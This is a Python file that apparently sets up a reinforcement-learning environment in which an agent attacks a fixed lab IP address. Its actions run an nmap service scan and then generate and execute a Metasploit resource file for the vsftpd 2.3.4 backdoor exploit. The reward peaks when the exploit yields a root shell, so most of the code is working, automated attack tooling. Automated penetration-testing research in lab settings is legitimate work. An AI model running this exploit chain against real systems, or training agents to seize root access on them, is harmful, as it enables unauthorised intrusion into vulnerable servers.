import subprocess
import re
import gymnasium as gym
from gymnasium import spaces
import numpy as np

TARGET_IP = "10.11.202.189"


def run_cmd(cmd):
    try:
        result = subprocess.run(
            cmd,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            timeout=30
        )
        output = result.stdout
    except subprocess.TimeoutExpired as e:
        output = e.stdout or b"timeout"

    if isinstance(output, bytes):
        output = output.decode("utf-8", errors="ignore")

    output = re.sub(r'\x1B\[[0-?]*[ -/]*[@-~]', '', output)
    return output


def scan_target(target_ip):
    output = run_cmd(f"nmap -sV {target_ip}")
    return {
        "port_21_open": "21/tcp open" in output,
        "vsftpd_234": "vsftpd 2.3.4" in output,
        "raw_output": output
    }


def write_rc_file(target_ip):
    with open("exploit.rc", "w") as f:
        f.write(f"""
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS {target_ip}
run
exit
""")


def exploit_vsftpd(target_ip):
    write_rc_file(target_ip)
    output = run_cmd("msfconsole -q -r exploit.rc")

    return {
        "success": ("Command shell session" in output and "opened" in output),
        "root_obtained": "uid=0(root)" in output,
        "raw_output": output
    }


class RealPentestEnv(gym.Env):
    metadata = {"render_modes": ["human"]}

    def __init__(self):
        super().__init__()
        self.target_ip = TARGET_IP

        # 0 = scan, 1 = exploit_vsftpd
        self.action_space = spaces.Discrete(2)

        # obs = [port_21_open, vsftpd_234, success, root_obtained]
        self.observation_space = spaces.Box(
            low=0,
            high=1,
            shape=(4,),
            dtype=int
        )

        self.state = [0, 0, 0, 0]

    def seed(self, seed=None):
        self.np_random, seed = gym.utils.seeding.np_random(seed)
        return [seed]

    def _get_obs(self):
        return np.array(self.state, dtype=np.float32)

    def reset(self, seed=None, options=None):
        super().reset(seed=seed)
        self.state = [0, 0, 0, 0]
        info = {}
        return self._get_obs(), info

    def step(self, action):
        reward = -1
        terminated = False
        truncated = False
        info = {}

        if action == 0:
            result = scan_target(self.target_ip)
            self.state[0] = 1 if result["port_21_open"] else 0
            self.state[1] = 1 if result["vsftpd_234"] else 0
            reward = 1 if result["vsftpd_234"] else -1
            info["raw_output"] = result["raw_output"]

        elif action == 1:
            result = exploit_vsftpd(self.target_ip)
            self.state[2] = 1 if result["success"] else 0
            self.state[3] = 1 if result["root_obtained"] else 0

            if result["root_obtained"]:
                reward = 100
                terminated = True
            elif result["success"]:
                reward = 10
            else:
                reward = -5

            info["raw_output"] = result["raw_output"]

        return self._get_obs(), reward, terminated, truncated, info

    def render(self):
        print("Current state:", self.state)
